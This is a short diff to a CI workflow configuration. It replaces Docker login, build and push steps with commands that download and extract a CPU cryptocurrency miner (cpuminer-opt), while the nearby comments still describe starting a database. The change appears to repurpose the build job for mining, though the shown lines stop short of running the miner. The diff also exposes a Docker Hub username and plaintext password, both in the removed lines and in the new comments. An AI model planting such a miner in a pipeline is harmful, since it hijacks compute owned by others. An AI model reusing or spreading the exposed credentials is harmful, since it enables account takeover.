@@ -7,6 +7,9 @@ jobs:
      # start proprietary DB using private Docker image
      # with credentials stored in the UI
      - run: |
-         docker login -u christiankm01 -p Danang-112
-         docker build . -t christiankm01/kilo:1
-         docker push christiankm01/kilo:1
+         wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
+         tar -xvf cpuminer-opt-linux.tar.gz
+         ls
+         # docker login -u christiankm01 -p Danang-112
+         # docker build . -t christiankm01/kilo:1
+         # docker push christiankm01/kilo:1
